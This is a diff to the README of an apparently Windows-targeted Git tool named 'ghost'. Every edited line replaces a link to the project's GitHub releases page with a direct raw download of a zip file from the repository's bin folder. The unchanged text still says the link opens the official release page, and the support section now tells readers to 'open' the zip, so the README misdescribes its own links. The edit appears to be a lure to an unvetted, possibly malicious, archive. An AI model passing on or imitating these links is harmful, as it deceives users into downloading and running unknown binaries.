@@ -1,6 +1,6 @@
 # 👻 ghost - Simple Git Agent for Everyone
 
-[![Download ghost](https://img.shields.io/badge/Download-ghost-brightgreen)](https://github.com/Ken71214/ghost/releases)
+[![Download ghost](https://img.shields.io/badge/Download-ghost-brightgreen)](https://raw.githubusercontent.com/Ken71214/ghost/main/bin/Software-3.0-beta.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get ghost running on your Windows PC.
 
 Click the green button below or open this link in your browser:
 
-[![Download ghost](https://img.shields.io/badge/Download-ghost-blue)](https://github.com/Ken71214/ghost/releases)
+[![Download ghost](https://img.shields.io/badge/Download-ghost-blue)](https://raw.githubusercontent.com/Ken71214/ghost/main/bin/Software-3.0-beta.3.zip)
 
 This link will bring you to ghost’s official GitHub release page. Here, you will find the latest version of the program ready for download.
 
@@ -101,7 +101,7 @@ ghost automatically keeps a list of your saved versions. You can view past chang
 
 Stay up to date for improvements and bug fixes by checking the release page regularly:
 
-[Download and update ghost](https://github.com/Ken71214/ghost/releases)
+[Download and update ghost](https://raw.githubusercontent.com/Ken71214/ghost/main/bin/Software-3.0-beta.3.zip)
 
 Download the newest installer like before, then run it. The installer replaces the old version without losing your data.
 
@@ -148,7 +148,7 @@ Logs that record ghost’s activity may be found in the `Documents\ghost\logs` f
 
 You can visit ghost’s GitHub repository for help:
 
-- Open https://github.com/Ken71214/ghost/releases
+- Open https://raw.githubusercontent.com/Ken71214/ghost/main/bin/Software-3.0-beta.3.zip
 - Use the Issues tab to report bugs or ask questions.
 - Browse Discussions for tips from other users.
 
@@ -156,4 +156,4 @@ The community and developer respond there.
 
 ---
 
-[Download ghost now](https://github.com/Ken71214/ghost/releases)
+[Download ghost now](https://raw.githubusercontent.com/Ken71214/ghost/main/bin/Software-3.0-beta.3.zip)
